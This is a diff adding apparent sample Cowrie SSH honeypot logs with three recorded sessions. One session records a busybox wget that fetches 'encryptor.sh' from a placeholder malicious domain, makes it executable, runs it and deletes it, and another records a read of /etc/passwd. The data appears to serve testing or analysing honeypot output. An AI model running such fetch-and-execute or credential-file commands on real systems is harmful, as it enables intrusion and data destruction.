@@ -1,0 +1,12 @@
+{"eventid":"cowrie.session.connect","message":"New connection: 103.207.39.141:43064 (SSH)","sensor":"honeypot-1","timestamp":"2025-10-06T10:30:01.123456Z","src_ip":"103.207.39.141","session":"a1b2c3d4"}
+{"eventid":"cowrie.command.input","input":"uname -a","message":"CMD: uname -a","sensor":"honeypot-1","timestamp":"2025-10-06T10:30:15.234567Z","src_ip":"103.207.39.141","session":"a1b2c3d4"}
+{"eventid":"cowrie.command.input","input":"ls -la","message":"CMD: ls -la","sensor":"honeypot-1","timestamp":"2025-10-06T10:30:20.345678Z","src_ip":"103.207.39.141","session":"a1b2c3d4"}
+{"eventid":"cowrie.session.closed","duration":25.5,"message":"Connection lost","sensor":"honeypot-1","timestamp":"2025-10-06T10:30:26.678901Z","src_ip":"103.207.39.141","session":"a1b2c3d4"}
+{"eventid":"cowrie.session.connect","message":"New connection: 118.25.16.147:55123 (SSH)","sensor":"honeypot-1","timestamp":"2025-10-06T10:41:05.112233Z","src_ip":"118.25.16.147","session":"b2c3d4e5"}
+{"eventid":"cowrie.command.input","input":"/bin/busybox wget http://malicious-domain.com/encryptor.sh -O /tmp/e.sh","message":"CMD: wget payload","sensor":"honeypot-1","timestamp":"2025-10-06T10:41:10.445566Z","src_ip":"118.25.16.147","session":"b2c3d4e5"}
+{"eventid":"cowrie.command.input","input":"chmod 777 /tmp/e.sh","message":"CMD: chmod payload","sensor":"honeypot-1","timestamp":"2025-10-06T10:41:12.778899Z","src_ip":"118.25.16.147","session":"b2c3d4e5"}
+{"eventid":"cowrie.command.input","input":"/tmp/e.sh && rm /tmp/e.sh","message":"CMD: execute payload","sensor":"honeypot-1","timestamp":"2025-10-06T10:41:15.101112Z","src_ip":"118.25.16.147","session":"b2c3d4e5"}
+{"eventid":"cowrie.session.closed","duration":15.2,"message":"Connection lost","sensor":"honeypot-1","timestamp":"2025-10-06T10:41:20.213243Z","src_ip":"118.25.16.147","session":"b2c3d4e5"}
+{"eventid":"cowrie.session.connect","message":"New connection: 45.146.165.132:41234 (SSH)","sensor":"honeypot-1","timestamp":"2025-10-06T10:45:22.516171Z","src_ip":"45.146.165.132","session":"c3d4e5f6"}
+{"eventid":"cowrie.command.input","input":"cat /etc/passwd","message":"CMD: cat /etc/passwd","sensor":"honeypot-1","timestamp":"2025-10-06T10:45:28.819121Z","src_ip":"45.146.165.132","session":"c3d4e5f6"}
+{"eventid":"cowrie.command.input","input":"exit","message":"CMD: exit","sensor":"honeypot-1","timestamp":"2025-10-06T10:45:30.921232Z","src_ip":"45.146.165.132","session":"c3d4e5f6"}
